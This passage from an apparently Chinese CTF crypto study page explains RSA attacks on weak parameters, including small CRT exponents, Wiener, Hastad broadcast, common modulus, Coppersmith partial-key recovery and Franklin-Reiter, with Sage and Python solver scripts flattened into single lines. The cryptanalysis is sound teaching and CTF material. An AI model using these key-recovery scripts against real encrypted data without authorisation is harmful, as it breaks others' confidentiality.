1 \\pmod {(p-1)}$，又由费马小定理，对任意 $r$，有 $m^{e \\cdot dp}\\equiv m \\pmod p$，即 $p \\mid (m^{e \\cdot dp}-m)$； 又 $p \\mid n$，很大概率 $p=\\gcd(m^{e \\cdot dp}-m,n)$。 变种4：给 $N,e,c$，其中 $dp$ 过小。 情形1：$q&lt;N^{0.382}$ 参数 $\\beta=\\cfrac{q_{\\text{bit}}}{N_{\\text{bit}}}, \\delta=\\cfrac{dp_{\\text{bit}}}{N_{\\text{bit}}}$，满足 $3\\beta &lt; 1+\\beta^2+2\\delta$，可确定 $\\beta$ 和 $\\delta$ 的值。 构造格子维度为 $n$，格子中模数 $N$ 的最大次幂为 $m$，应满足关系 $\\cfrac{m(m+1)}{2} + \\cfrac{n(n-1)(2\\delta+\\beta)}{2}-(1-\\beta)nm &lt; 0$ 确定 $\\beta$ 和 $\\delta$ 之后，可枚举确定 $n$ 和 $m$ 的取值（最小值），$m=(1-\\beta)n$ 是一个较优的取值。 12345beta = delta = n = round((1-2*beta-2*delta)/((1-beta)^2-2*delta-beta),6)m = (1-beta)*nprint(m,n) 构造多项式，分解多项式为 $(ax+by)$ 项，其中 $a=k,b=dp$。 12345678910111213141516171819202122232425262728293031323334353637383940# 脚本1# Sagedef getC(Scale): C = [[0 for __ in range(Scale)] for _ in range(Scale)] for i in range(Scale): for j in range(Scale): if i == j or j == 0: C[i][j] = 1 else: C[i][j] = C[i-1][j-1] + C[i-1][j] return Cdef getMatrix(Scale, Mvalue, N, E, Del, Bet): M = [[0 for __ in range(Scale)] for _ in range(Scale)] C = getC(Scale) X, Y = int(pow(N,Del)*(Scale+1)//2), int(pow(N,(Del+Bet))*(Scale+1)//2) for i in range(Scale): for j in range(Scale): M[i][j] = N**max(Mvalue-i,0)*E**(max(i-j,0))*X**(Scale-1-j)*Y**j*C[i][j]*(-1)**j return MN =E =delta = 0.01beta = 0.37Scale = 35Mvalue = 22M = getMatrix(Scale,Mvalue,N,E,delta,beta)M = matrix(ZZ,M)A = M.LLL()[0]p = []X = int(pow(N,delta)*(Scale+1)//2)Y = int(pow(N,(delta+beta))*(Scale+1)//2)for i in range(Scale): p.append(A[i]//(X**(Scale-1-i)*Y**i))PR.&lt;x,y&gt; = PolynomialRing(ZZ)f = 0for i in range(Scale): f += p[i]*x^(Scale-1-i)*y^iprint(f.factor()) 123456789101112131415161718192021222324252627282930313233343536# 脚本2# SageN =e =n = 12beta = 0.36delta = 0.02X = int(N ** delta*(n+1)/2)Y = int(N ** (delta + beta)*(n+1)/2)def C(a,b): ret=1 for i in range(b): ret *= (a-i) ret /= (b-i) return retdef get_Matrix(n,m): MM=[[0 for __ in range(n)] for _ in range(n)] for j in range(n): pN = max(0,m-j) for i in range(j+1): MM[j][i] = pow(N,pN)*pow(X,n-i-1)*pow(Y,i)*pow(e,j-i)*C(j,i)*pow(-1,i) MM = Matrix(ZZ,MM) return MMM = get_Matrix(n,n//2+1)L = M.LLL()[0]x,y = var(&#x27;x&#x27;),var(&#x27;y&#x27;)f = 0for i in range(n): f += x**(n-i-1) * y**i * (L[i] // pow(X,n-i-1) // pow(Y,i))print(f.factor()) 参考： Cryptanalysis of Unbalanced RSA with Small CRT-Exponent https://hash-hash.github.io/2022/05/14/Unbalanced-RSA-with-Small-CRT-Exponent/#An-Approach-Modulo-e NSSCTF Round#3 - Secure_in_N 情形2：$q&lt;N^{0.468}$ 参数 $\\beta=\\cfrac{q_{\\text{bit}}}{N_{\\text{bit}}}, \\delta=\\cfrac{dp_{\\text{bit}}}{N_{\\text{bit}}},\\alpha=\\cfrac{e_{\\text{bit}}}{N_{\\text{bit}}}$， 变量上界 $X=2N^{\\alpha+\\beta+\\delta-1},Y=N^{\\beta},Z=2N^{1-\\beta}$ ，对于变量 $m$ 需充分大。 $\\tau=\\cfrac{(1-\\beta)^2-\\delta}{2\\beta(1-\\beta)},\\sigma=\\cfrac{1-\\beta-\\delta}{2(1-\\beta)},t=\\tau m,s=\\sigma m$ 整数域上有根 $(x,y,z)=(x_0,p,q)$。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117from copy import deepcopy# https://www.iacr.org/archive/pkc2006/39580001/39580001.pdf# Author: ZM__________J, To1inN = e = alpha = log(e, N)beta = delta = P.&lt;x,y,z&gt;=PolynomialRing(ZZ) X = ceil(2 * N^(alpha + beta + delta - 1))Y = ceil(2 * N^beta)Z = ceil(2 * N^(1 - beta)) def f(x,y): return x*(N-y)+Ndef trans(f): my_tuples = f.exponents(as_ETuples=False) g = 0 for my_tuple in my_tuples: exponent = list(my_tuple) mon = x ^ exponent[0] * y ^ exponent[1] * z ^ exponent[2] tmp = f.monomial_coefficient(mon) my_minus = min(exponent[1], exponent[2]) exponent[1] -= my_minus exponent[2] -= my_minus tmp *= N^my_minus tmp *= x ^ exponent[0] * y ^ exponent[1] * z ^ exponent[2] g += tmp return g m = 5 # need to be adjusted according to different situationstau = ((1 - beta)^2 - delta) / (2 * beta * (1 - beta))sigma = (1 - beta - delta) / (2 * (1 - beta)) print(sigma * m)print(tau * m) s = ceil(sigma * m)t = ceil(tau * m)my_polynomials = []for i in range(m+1): for j in range(m-i+1): g_ij = trans(e^(m-i) * x^j * z^s * f(x, y)^i) my_polynomials.append(g_ij) for i in range(m+1): for j in range(1, t+1): h_ij = trans(e^(m-i) * y^j * z^s * f(x, y)^i) my_polynomials.append(h_ij) known_set = set()new_polynomials = []my_monomials = [] # construct partial orderwhile len(my_polynomials) &gt; 0: for i in range(len(my_polynomials)): f = my_polynomials[i] current_monomial_set = set(x^tx * y^ty * z^tz for tx, ty, tz in f.exponents(as_ETuples=False)) delta_set = current_monomial_set - known_set if len(delta_set) == 1: new_monomial = list(delta_set)[0] my_monomials.append(new_monomial) known_set |= current_monomial_set new_polynomials.append(f) my_polynomials.pop(i) break else: raise Exception(&#x27;GG&#x27;) my_polynomials = deepcopy(new_polynomials) nrows = len(my_polynomials)ncols = len(my_monomials)L = [[0 for j in range(ncols)] for i in range(nrows)] for i in range(nrows): g_scale = my_polynomials[i](X * x, Y * y, Z * z) for j in range(ncols): L[i][j] = g_scale.monomial_coefficient(my_monomials[j]) # remove N^jfor i in range(nrows): Lii = L[i][i] N_Power = 1 while (Lii % N == 0): N_Power *= N Lii //= N L[i][i] = Lii for j in range(ncols): if (j != i): L[i][j] = (L[i][j] * inverse_mod(N_Power, e^m)) L = Matrix(ZZ, L)nrows = L.nrows() L = L.LLL()# Recover polyreduced_polynomials = []for i in range(nrows): g_l = 0 for j in range(ncols): g_l += L[i][j] // my_monomials[j](X, Y, Z) * my_monomials[j] reduced_polynomials.append(g_l) # eliminate zmy_ideal_list = [y * z - N] + reduced_polynomials # Varietymy_ideal_list = [Hi.change_ring(QQ) for Hi in my_ideal_list]for i in range(len(my_ideal_list),3,-1): print(i) V = Ideal(my_ideal_list[:i]).variety(ring=ZZ) print(V) 参考： New Attacks on RSA with Small Secret CRT-Exponents NCTF 2022 - dp_promax ​ 给p,q,dp,dq,c$dp=d \\bmod (p-1)$，$dq=d \\bmod (q-1)$ $\\because d=k_{1}(p-1)+dp=k_{2}(q-1)+dq\\\\\\Leftrightarrow k_{1}(p-1)=(dq-dp)+k_{2}(q-1)\\\\\\Leftrightarrow k_{1}\\frac{p-1}{\\gcd(p-1,q-1)}=\\frac{dq-dp}{\\gcd(p-1,q-1)}+k_{2}\\frac{q-1}{\\gcd(p-1,q-1)}\\\\\\Rightarrow k_{1}\\frac{p-1}{\\gcd(p-1,q-1)}\\equiv\\frac{dq-dp}{\\gcd(p-1,q-1)} \\pmod {\\frac{q-1}{\\gcd(p-1,q-1)}}\\\\\\Leftrightarrow k_{1}\\equiv \\text{inv}(\\frac{p-1}{\\gcd(p-1,q-1)},\\frac{q-1}{\\gcd(p-1,q-1)})\\cdot \\frac{dq-dp}{\\gcd(p-1,q-1)} \\pmod {\\frac{q-1}{\\gcd(p-1,q-1)}}$ 将 $k_{1}=k_{3}\\frac{q-1}{\\gcd(p-1,q-1)}+\\text{inv}(\\frac{p-1}{\\gcd(p-1,q-1)},\\frac{q-1}{\\gcd(p-1,q-1)})\\cdot \\frac{dq-dp}{\\gcd(p-1,q-1)}$ 代入 $d=k_{1}(p-1)+dp$ $d=k_{3}\\frac{(p-1)(q-1)}{\\gcd(p-1,q-1)}+\\text{inv}(\\frac{p-1}{\\gcd(p-1,q-1)},\\frac{q-1}{\\gcd(p-1,q-1)})\\cdot \\frac{(dq-dp)(p-1)}{\\gcd(p-1,q-1)}+dp\\\\\\Rightarrow d\\equiv \\text{inv}(\\frac{p-1}{\\gcd(p-1,q-1)},\\frac{q-1}{\\gcd(p-1,q-1)})\\cdot \\frac{(dq-dp)(p-1)}{\\gcd(p-1,q-1)}+dp \\pmod{\\frac{(p-1)(q-1)}{\\gcd(p-1,q-1)}}$ 12345678910111213141516171819import gmpy2 as gpp = q = dp = dq = c = n = p*qphin = (p-1)*(q-1)dd = gp.gcd(p-1, q-1)d=(dp-dq)//dd * gp.invert((q-1)//dd, (p-1)//dd) * (q-1) +dqprint(d)m = gp.powmod(c, d, n)print(&#x27;-------------------&#x27;)print(m)print(hex(m)[2:])print(bytes.fromhex(hex(m)[2:])) ​ 低解密指数攻击/低私钥指数攻击（e长度较大，d小，Wiener Attack）适用情况：已知 $N,e$，且 $e$ 过大或过小。 $\\varphi(n) = (p-1)(q-1)=pq - (p + q) + 1=N - (p + q) + 1$ $\\because p, q$ 非常大，$\\therefore\\,pq\\gg p+q$， $\\therefore\\varphi(n)\\approx N$ $\\because ed\\equiv1\\,mod\\,\\varphi(n)$，$\\therefore ed-1=k\\varphi(n)$，这个式子两边同除 $d\\varphi(n)$ 可得： $\\cfrac{e}{\\varphi(n)}-\\cfrac{k}{d}=\\cfrac{1}{d\\varphi(n)}$ $\\because \\varphi(n)\\approx N$，$\\therefore \\cfrac{e}{N}-\\cfrac{k}{d}=\\cfrac{1}{d\\varphi(n)}$，同样 $d\\varphi(n)$ 是一个很大的数，所以 $\\cfrac{e}{N}$ 略大于 $\\cfrac{k}{d}$ 因为 $e$ 和 $N$ 是知道的，所以计算出 $\\cfrac{e}{N}$ 后，比它略小的 $\\cfrac{k}{d}$ ，可以通过计算 $\\cfrac{e}{N}$ 的连分数展开，依次算出这个分数每一个渐进分数，由于 $\\cfrac{e}{N}$ 略大于 $\\cfrac{k}{d}$，Wiener 证明了，该攻击能精确的覆盖 $\\cfrac{k}{d}$。 在 $e$ 过大或过小的情况下，可使用算法从 $e$ 中快速推断出 $d$ 的值。可以解决 $q&lt;p&lt;2q,d&lt;\\cfrac{1}{3}N^{\\frac{1}{4}}$ 的问题。 RSAWienerHacker工具：https://github.com/pablocelayes/rsa-wiener-attack 12345678910111213141516171819202122232425#脚本1#Sagedef factor_rsa_wiener(N, e): N = Integer(N) e = Integer(e) cf = (e / N).continued_fraction().convergents() for f in cf: k = f.numer() d = f.denom() if k == 0: continue phi_N = ((e * d) - 1) / k b = -(N - phi_N + 1) dis = b ^ 2 - 4 * N if dis.sign() == 1: dis_sqrt = sqrt(dis) p = (-b + dis_sqrt) / 2 q = (-b - dis_sqrt) / 2 if p.is_integer() and q.is_integer() and (p * q) % N == 0: p = p % N q = q % N if p &gt; q: return (p, q) else: return (q, p) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#脚本2#Sagedef rational_to_contfrac(x,y): # Converts a rational x/y fraction into a list of partial quotients [a0, ..., an] a = x // y pquotients = [a] while a * y != x: x, y = y, x - a * y a = x // y pquotients.append(a) return pquotientsdef convergents_from_contfrac(frac): # computes the list of convergents using the list of partial quotients convs = []; for i in range(len(frac)): convs.append(contfrac_to_rational(frac[0 : i])) return convsdef contfrac_to_rational (frac): # Converts a finite continued fraction [a0, ..., an] to an x/y rational. if len(frac) == 0: return (0,1) num = frac[-1] denom = 1 for _ in range(-2, -len(frac) - 1, -1): num, denom = frac[_] * num + denom, num return (num, denom)n = e = c = def egcd(a, b): if a == 0: return (b, 0, 1) g, x, y = egcd(b % a, a) return (g, y - (b // a) * x, x)def mod_inv(a, m): g, x, _ = egcd(a, m) return (x + m) % mdef isqrt(n): x = n y = (x + 1) // 2 while y &lt; x: x = y y = (x + n // x) // 2 return x def crack_rsa(e, n): frac = rational_to_contfrac(e, n) convergents = convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 # check if x*x - s*x + n = 0 has integer roots D = s * s - 4 * n if D &gt;= 0: sq = isqrt(D) if sq * sq == D and (s + sq) % 2 == 0: return dd = crack_rsa(e, n)m = hex(pow(c, d, n))[2:]print(bytes.fromhex(m)) 12345678910111213141516171819202122232425262728293031#脚本3from Crypto.Util.number import long_to_bytese = n = c = #将分数x/y展开为连分数的形式def transform(x,y): arr=[] while y: arr+=[x//y] x,y=y,x%y return arr #求解渐进分数def sub_fraction(k): x=0 y=1 for i in k[::-1]: x,y=y,x+i*y return (y,x)data=transform(e,n)for x in range(1,len(data)+1): data1=data[:x] d = sub_fraction(data1)[1] m = pow(c,d,n) flag = long_to_bytes(m) if b&#x27;flag&#123;&#x27; in flag: print(flag) break 变种1：$\\cfrac{N_1}{N_2}&lt;\\cfrac{q_1}{q_2}&lt;1$ 参考：2020年羊城杯 - RRRRRRRSA Paper: https://eprint.iacr.org/2015/399.pdf 尝试对 $\\cfrac{N_1}{N_2}$ 进行连分数展开并求其各项渐进分数，记为 $\\cfrac{t_i}{s_i}$ 并验证 $N_1\\% {t_k}==0$ 是否成立，如果成立，那么 $q_1=t_k，q_2=s_k$。 连分数逼近： 123456789101112131415161718192021222324252627282930def transform(x,y): #使用辗转相除将分数x/y转为连分数的形式 res=[] while y: res.append(x//y) x,y=y,x%y return res def continued_fraction(sub_res): numerator,denominator=1,0 for i in sub_res[::-1]: #从sublist的后面往前循环 denominator,numerator=numerator,i*numerator+denominator return denominator,numerator #得到渐进分数的分母和分子，并返回 #求解每个渐进分数def sub_fraction(x,y): res=transform(x,y) res=list(map(continued_fraction,(res[0:i] for i in range(1,len(res))))) #将连分数的结果逐一截取以求渐进分数 return res def wienerAttack(n1,n2): for (q2,q1) in sub_fraction(n1,n2): #用一个for循环来注意试探n1/n2的连续函数的渐进分数，直到找到一个满足条件的渐进分数 if q1==0: #可能会出现连分数的第一个为0的情况，排除 continue if n1%q1==0 and q1!=1: #成立条件 return (q1,q2) print(&quot;该方法不适用&quot;) N1=N2=print(wienerAttack(N1,N2)) ​ 低加密指数广播攻击（Hastad攻击）适用情况： $n,c$ 不同，$m,e$ 相同。一般会是 $e=k$，然后给 $k$ 组数据。 如果一个用户使用同一个加密指数 e 加密了同一个密文，并发送给了其他 e 个用户。那么就会产生广播攻击。这一攻击由 Håstad 提出。 使用不同的模数 $n$，相同的公钥指数 $e$ 加密相同的信息，就会得到多个 $m^e \\equiv c_i \\pmod {n_i}$，将 $m^e$ 视为一个整体 $M$，这就是典型的中国剩余定理适用情况。容易求得 $m^e$ 的值，当 $e$ 较小时直接开 $e$ 方即可，可使用gmpy2.iroot(M,e) 方法。 更一般情况（$k$ 组数据的 $N$ 不同）见15。 123456789#sagedef chinese_remainder(modulus, remainders): Sum = 0 prod = reduce(lambda a, b: a*b, modulus) for m_i, r_i in zip(modulus, remainders): p = prod // m_i Sum += r_i * (inverse_mod(p,m_i)*p) return Sum % prodchinese_remainder([3,5,7],[2,3,2]) #23 12#sagecrt([2,3,2],[3,5,7]) ​ 共模攻击（n,m相同，c,e不同）当$n$不变的情况下，知道$n,e_1,e_2,c_1,c_2$可以在不知道$d_1,d_2$的情况下，解出$m$。 首先假设$e_1,e_2$互质, 即 $\\gcd(e_1,e_2)=1$ 此时则有 $e_1s_1+e_2s_2 = 1$ 式中，$s_1,s_2$皆为整数，但是一正一负。 通过扩展欧几里德算法，我们可以得到该式子的一组解$（s_1,s_2）$，假设$s_1$为正数,$s_2$为负数。 因为 $c_1 = m^{e_1}\\bmod n, c_2 = m^{e_2}\\bmod n$ 所以 $(c_1^{s_1}c_2^{s_2})\\bmod n = ((m^{e_1}\\bmod n)^{s_1}(m^{e_2}\\bmod n)^{s_2})\\bmod n$ 根据模运算性质，可以化简为 $(c_1^{s_1}c_2^{s_2})\\bmod n = ((m^{e_1})^{s_1}(m^{e_2})^{s_2})\\bmod n$ 即 $(c_1^{s_1}c_2^{s_2})\\bmod n = (m^{e_1s_1+e_2s_2})\\bmod n$ 又前面提到 $e_1s_1+e_2s_2 = 1$ 所以 $(c_1^{s_1}c_2^{s_2})\\bmod n = m\\bmod n$ 即 $c_1^{s_1}c_2^{s_2}= m$ 1234567891011121314151617181920212223242526import gmpy2 as gpdef egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)n = c1 = c2 = e1 = e2 = s = egcd(e1, e2)s1 = s[1]s2 = s[2]if s1&lt;0: s1 = - s1 c1 = gp.invert(c1, n)elif s2&lt;0: s2 = - s2 c2 = gp.invert(c2, n)m = pow(c1,s1,n)*pow(c2,s2,n) % nprint(hex(m)[2:])print(bytes.fromhex(hex(m)[2:])) ​ e,m相同，多个n中存在两个n有GCD（模不互素）适用情况：存在两个或更多模数 ，且 $\\gcd(n_1,n_2)\\ne 1$ 。 多个模数 $n$ 共用质数，则可以很容易利用欧几里得算法求得他们的质因数之一 $\\gcd(n_1,n_2)$，然后这个最大公约数可用于分解模数分别得到对应的 $p$ 和 $q$，即可进行解密。 1234567891011121314151617181920212223import gmpy2 as gpn=[]for i in n: for j in n: if (i&lt;&gt;j): pub_p=gp.gcdext(i,j) if (pub_p[0]&lt;&gt;1)&amp;(i&gt;j): print(i) print(j) print(pub_p[0]) a=i,p=pub_p[0]q=a//pp =q =e =c =n = p*qphi = (p-1) * (q-1)d = gp.invert(e, phi)m = pow(c, d, n)print(hex(m)[2:])print(bytes.fromhex(hex(m)[2:])) ​ Rabin加密适用情况：$e=2$ 。 一般先通过其他方法分解得到 $p,q$，然后解密。 函数返回四个数，这其中只有一个是我们想要的明文，需要通过其他方式验证。 1234567891011121314151617181920212223import gmpy2def rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) // 4, p) mq = pow(c, (q + 1) // 4, q) yp = gmpy2.invert(p, q) yq = gmpy2.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s return (r, rr, s, ss) c = p = q = m = rabin_decrypt(c,p,q)for i in range(4): try: print(bytes.fromhex(hex(m[i])[2:])) except: pass ​ Boneh and Durfee attack$e$ 非常大接近于$N$，即 $d$ 较小时。与低解密指数攻击类似，比低解密指数攻击（Wiener Attack）更强，可以解决$\\cfrac{1}{3}N^{\\frac{1}{4}} \\leq d \\leq N^{0.292}$的问题。 $\\because ed=k \\varphi +1$ $\\therefore k \\varphi+1 \\equiv 0 \\pmod e \\Rightarrow k(N+1-p-q)+1 \\equiv 0 \\pmod e \\Rightarrow 2k(\\frac{N+1}{2}+\\frac{-p-q}{2}) \\equiv 0 \\pmod e$ 设 $A=\\frac{N+1}{2},y=\\frac{-p-1}{2},x=2k$，有 $f(k,y)=1+x\\cdot(A+y)$ 如果在模 $e$ 下解得该方程的根 $x,y$，由 $ed=1+x\\cdot(A+y)$ 可以得到 $d$。 参考 RSA-and-LLL-attacks。 变种1：$e$ 很大，$dp$ 很小，且 $d&gt;2N^{\\beta}$。 May’s Attack 假设 $e&lt;\\varphi(N),q \\le N^{\\beta},\\beta \\le \\frac{1}{2}$，因 $ed_p \\equiv 1 \\pmod {p-1}$，有 $ed_p=1+k(p-1)$， 对于 $k \\in \\mathbb{N}$，有 $ed_p=(k-1)(p-1)+p$，即 $ed_pq=(k-1)(N-q)+N$。 设 $x,y$ 为参数，则多项式 $f(x,y)=x(N-y)+N$ 在模 $e$ 下存在根 $(x_0,y_0)=(k-1,q)$，用coppersmith attack可解。 ​ 光滑数p-1 光滑Pollard’s p-1分解算法。 如果一个整数的所有素因子都不大于 $B$，我们称这个数为 $B$-Smooth 数。 设 $p-1$ 是 $B$-Smooth 的，可设 $p-1=p_1p_2 \\cdots p_n(\\forall 1 \\leq i \\leq n,p_i \\leq B)$， 若 $p_1,p_2, \\cdots ,p_n$ 两两不同，则 $p_1p_2 \\cdots p_n \\mid B! \\Rightarrow (p-1) \\mid B! \\Rightarrow B!=k(p-1)$。 因此 $a^{B!} \\equiv a^{k(p-1)} \\equiv 1 \\pmod p$，假设 $N=pq$，计算 $\\gcd(a^{B!}-1，N)$，只要结果大于 $0$ 小于 $N$，那么结果就为 $p$。 12345678910111213from gmpy2 import *a = 2k = 2N = while True: a = powmod(a, k, N) res = gcd(a-1, N) if res != 1 and res != N: q = N // res print(&quot;p =&quot;,res) print(&quot;q =&quot;,q) break k += 1 p+1 光滑William’s p+1分解算法。 12345678910111213141516171819def mlucas(v, a, n): &quot;&quot;&quot; Helper function for williams_pp1(). Multiplies along a Lucas sequence modulo n. &quot;&quot;&quot; v1, v2 = v, (v**2 - 2) % n for bit in bin(a)[3:]: v1, v2 = ((v1**2 - 2) % n, (v1*v2 - v) % n) if bit == &quot;0&quot; else ((v1*v2 - v) % n, (v2**2 - 2) % n) return v1for v in count(1): for p in primegen(): e = ilog(isqrt(n), p) if e == 0: break for _ in xrange(e): v = mlucas(v, p, n) g = gcd(v-2, n) if 1 &lt; g &lt; n: return g # g|n if g == n: break ​ Coppersmith定理指出在一个 $e$ 阶的 $\\bmod n$ 多项式 $f(x)$ 中，如果有一个根小于 $n^{\\frac{1}{e}}$，就可以运用一个 $O(\\log n)$ 的算法求出这些根。 Coppersmith攻击（已知p的高位攻击）知道 $p$ 的高位为 $p$ 的位数的约$\\frac12$时即可。 12345678910111213141516171819#Sagefrom sage.all import *n = p4 = #p去0的剩余位e = pbits = 1024kbits = pbits - p4.nbits()print(p4.nbits())p4 = p4 &lt;&lt; kbitsPR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + p4roots = f.small_roots(X=2^kbits, beta=0.4)#经过以上一些函数处理后，n和p已经被转化为10进制if roots: p = p4+int(roots[0]) print(&quot;n: &quot;+str(n)) print(&quot;p: &quot;+str(p)) print(&quot;q: &quot;+str(n//p)) ​ Coppersmith攻击（已知m的高位攻击）这里我们假设我们首先加密了消息 $m$，如下 $C\\equiv m^e \\bmod N$ 并且我们假设我们知道消息 $m$ 的很大的一部分 $m_0$，即 $m=m_0+x$，但是我们不知道 $x$。那么我们就有可能通过该方法进行恢复消息。这里我们不知道的 $x$ 其实就是多项式的根，需要满足 Coppersmith 的约束。 可以参考 https://github.com/mimoo/RSA-and-LLL-attacks 。 $e$ 足够小，且部分明文泄露时，可以采用Coppersmith单变量模等式的攻击，如下： $c=m^{e}\\bmod n=(mbar+x_{0})^{e}\\bmod n$，其中 $mbar = (m &gt;&gt; k\\text{bits}) &lt;&lt; k\\text{bits}$ 当 $\\vert x_{0}\\vert\\leq N^{\\frac{1}{e}}$ 时，可以在 $\\log N$ 和 $e$ 的多项式时间内求出 $x_0$。 12345678910111213#Sagen = e = c = mbar = kbits = beta = 1nbits = n.nbits()print(&quot;upper &#123;&#125; bits of &#123;&#125; bits is given&quot;.format(nbits - kbits, nbits))PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (mbar + x)^e - cx0 = f.small_roots(X=2^kbits, beta=1)[0] # find root &lt; 2^kbits with factor = nprint(&quot;m:&quot;, mbar + x0) ​ Coppersmith攻击（已知d的低位攻击）如果知道 $d$ 的低位，低位约为 $n$ 的位数的 $\\frac14$ （$\\frac{n.n\\text{bits}()}{4}$）就可以恢复 $d$。 123456789101112131415161718192021222324252627282930313233#Sagedef partial_p(p0, kbits, n): PR.&lt;x&gt; = PolynomialRing(Zmod(n)) nbits = n.nbits() f = 2^kbits*x + p0 f = f.monic() roots = f.small_roots(X=2^(nbits//2-kbits), beta=0.4) # find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.4 if roots: x0 = roots[0] p = gcd(2^kbits*x0 + p0, n) return ZZ(p)def find_p(d0, kbits, e, n): X = var(&#x27;X&#x27;) for k in range(1, e+1): results = solve_mod([e*d0*X - k*X*(n-X+1) + k*n == X], 2^kbits) for x in results: p0 = ZZ(x[0]) p = partial_p(p0, kbits, n) if p and p != 1: return pif __name__ == &#x27;__main__&#x27;: n = e = c = d0 = beta = 0.5 nbits = n.nbits() kbits = d0.nbits() print(&quot;lower %d bits (of %d bits) is given&quot; % (kbits, nbits)) p = int(find_p(d0, kbits, e, n)) print(&quot;found p: %d&quot; % p) q = n//int(p) print(&quot;d:&quot;, inverse_mod(e, (p-1)*(q-1))) 变种1：$n=p\\cdot q\\cdot r$，已知 $n,p,d=\\text{inv}(e,\\varphi(n)),e,c$ $k(p-1)\\rightarrow k’,qr\\rightarrow n’,q+r\\rightarrow s$ $ed_{0}\\equiv 1+k’(n’-s+1) \\pmod {2^{d_{0}.n\\text{bits}()}}\\quad (1)$ $q^{2}-sq+n’\\equiv 0 \\pmod {2^{d_{0}.n\\text{bits}()}}\\quad (2)$ 联立可得，$(ed_{0}-1-k’n’-k’)q+k’q^{2}+k’n’\\equiv 0 \\pmod {2^{d_{0}.n\\text{bits}()}}$ 即求解同余方程可得 $q$ 的低 $size(d0)$ 位，本来是个partial d的coppersmith问题，但因为step1求解同余方程后得到的 $q$ 已是完整的 $q$，所以无需后续的coppersmith。 参考：Dragon CTF 2019 - RSA Chained 12345678910111213141516171819202122#Sagedef find_p(d0, kbits, e, n, p): X = var(&#x27;X&#x27;) for k in range(1, e + 1): k_dot = k * (p - 1) results = solve_mod([e * d0 * X - k_dot * X * (n - X + 1) + k_dot * n == X], 2^kbits) for x in results: q = ZZ(x[0]) if n % q == 0: return q return Nonen = ... # q * rp = c = d0 = e = kbits = d0.nbits()q = find_p(d0, kbits, e, n, p)phi = (p - 1) * (q - 1) * (n // q - 1)d = inverse_mod(e, phi)print(bytes.fromhex(hex(pow(c, d, p * n))[2:])) ​ Coppersmith攻击（已知N一个因子的高位，部分p）当我们知道一个公钥中模数 $N$ 的一个因子的较高位时，我们就有一定几率来分解 $N$。 参考 https://github.com/mimoo/RSA-and-LLL-attacks 。 关注下面的代码： 1234567beta = 0.5dd = f.degree()epsilon = beta / 7mm = ceil(beta**2 / (dd * epsilon))tt = floor(dd * mm * ((1/beta) - 1))XX = ceil(N**((beta**2/dd) - epsilon)) + 1000000000000000000000000000000000roots = coppersmith_howgrave_univariate(f, N, beta, mm, tt, XX) 其中， 必须满足 $q\\ge N^{beta}$，所以这里给出了 $beta=0.5$，显然两个因数中必然有一个是大于的。 XX 是 $f(x)=q′+x$ 在模 $q$ 意义下的根的上界，自然我们可以选择调整它，这里其实也表明了我们已知的 $q′$ 与因数 $q$ 之间可能的差距。 123456789101112131415#Sagen = e = c = pbar = kbits = print(&quot;upper %d bits (of %d bits) is given&quot; % (pbar.nbits()-kbits, pbar.nbits()))PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + pbarx0 = f.small_roots(X=2^kbits, beta=0.4)[0] # find root &lt; 2^kbits with factor &gt;= n^0.4p = x0 + pbarprint(&quot;p:&quot;, p)q = n // int(p)d = inverse_mod(e, (p-1)*(q-1))print(&quot;m:&quot;, pow(c, d, n)) 注： sage的small_root传参X不能过大，需自行判断阈值并调整（如果X过大，即使存在X内的解，也无法求出）； 比如 $p$ 的低位泄露时因为不确定缺失高位的具体比特数，所以要在 $2^{\\frac{n.n\\text{bits}()}{2}−k\\text{bits}}$ 附近作X的阈值估计； 无法确定拿到的 $p$ 是否大于 $q$，所以对 $\\beta=0.5$ 进行调整至 $0.4$。 ​ Coppersmith’s Short-pad Attack &amp; Related Message Attack（Franklin-Reiter攻击）目前在大部分消息加密之前都会进行 padding，但是如果 padding 的长度过短（$m \\in (0,\\lfloor\\frac{n.n\\text{bits}()}{e^2}\\rfloor]$），也有可能被很容易地攻击。 这里所谓 padding 过短，其实就是对应的多项式的根会过小。 当 Alice 使用同一公钥对两个具有某种线性关系的消息 $M_1$ 与 $M_2$ 进行加密，并将加密后的消息 $C_1$，$C_2$ 发送给了 Bob 时，我们就可能可以获得对应的消息 $M_1$ 与 $M_2$ 。这里我们假设模数为 $N$，两者之间的线性关系如下： $M_1 \\equiv f(M_2) \\bmod N$ 其中 $f$ 为一个线性函数，比如说 $f=ax+b$。 在具有较小错误概率下的情况下，其复杂度为 $O(e\\log^2N)$。 这一攻击由 Franklin与Reiter 提出。 1234567891011121314151617181920#脚本1#Sageimport binasciidef attack(c1, c2, n, e): PR.&lt;x&gt;=PolynomialRing(Zmod(n)) # replace a,b,c,d g1 = (a*x+b)^e - c1 g2 = (c*x+d)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0]c1 =c2 =n =e =m1 = attack(c1, c2, n, e)print(binascii.unhexlify(&quot;%x&quot; % int(m1))) 123456789101112131415161718192021222324252627282930313233343536#脚本2#Sagedef short_pad_attack(c1, c2, e, n): PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n)) PRx.&lt;xn&gt; = PolynomialRing(Zmod(n)) PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+y)^e - c2 q1 = g1.change_ring(PRZZ) q2 = g2.change_ring(PRZZ) h = q2.resultant(q1) h = h.univariate_polynomial() h = h.change_ring(PRx).subs(y=xn) h = h.monic() kbits = n.nbits()//(2*e*e) diff = h.small_roots(X=2^kbits, beta=0.4)[0] # find root &lt; 2^kbits with factor &gt;= n^0.4 return diffdef 